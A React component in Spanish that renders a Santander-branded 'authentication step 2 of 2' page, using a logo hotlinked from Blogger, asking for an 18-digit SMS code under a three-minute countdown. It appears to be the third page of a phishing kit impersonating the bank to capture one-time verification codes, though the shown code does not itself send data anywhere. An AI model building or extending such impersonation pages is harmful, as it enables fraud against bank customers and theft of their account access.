import React, { useState, useEffect } from 'react';
import '../css/tercerapag.css';

function Tercerapag() {
  const [timeLeft, setTimeLeft] = useState(180); // 3 minutes in seconds

  useEffect(() => {
    if (timeLeft > 0) {
      const timerId = setInterval(() => {
        setTimeLeft(timeLeft - 1);
      }, 1000);
      return () => clearInterval(timerId);
    }
  }, [timeLeft]);

  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${minutes}:${secs < 10 ? '0' : ''}${secs}`;
  };

  return (
    <div className="auth-container">
      <div className="auth-header">
        <span className="auth-logo"><img style={{width:'160px'}} src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-XzSWZdtf3Lgk80cOwX_lyUAiAGOkQer4gLjKSlGD1_Lso4yPSiWbUTVw-ssFpCkB2I-e4_gAGp3PFTz6uKHDMX3hD8QcVDWegy5jXJ4oOpTmXOzCTVoOEj5H0V_mKgxE9y9aAj5deqw/s640/logo+santander+nuevo2.jpg" alt="" /></span>
      </div>
      <div className="auth-progress">
        <div className="auth-step-circle">2</div>
        <div className="auth-status">
          <p>Lo estamos autenticando</p>
          <p>2 de 2</p>
        </div>
        <div className="auth-progress-bar">
          <div className="auth-progress-bar-fill"></div>
        </div>
      </div>
      <form className="auth-form">
        <label>
          Ingrese los 18 números que recibió por mensaje SMS:
          <input type="text" name="sms-code" placeholder="18 dígitos" className="auth-input" maxLength="18" />
        </label>
        <div className="auth-timer">
          <span>Tiempo restante:</span>
          <span className="auth-timer-time">{formatTime(timeLeft)}</span>
        </div>
        <button type="submit" className="auth-continue-button" disabled={timeLeft === 0}>
          Continuar
        </button>
      </form>
    </div>
  );
}

export default Tercerapag;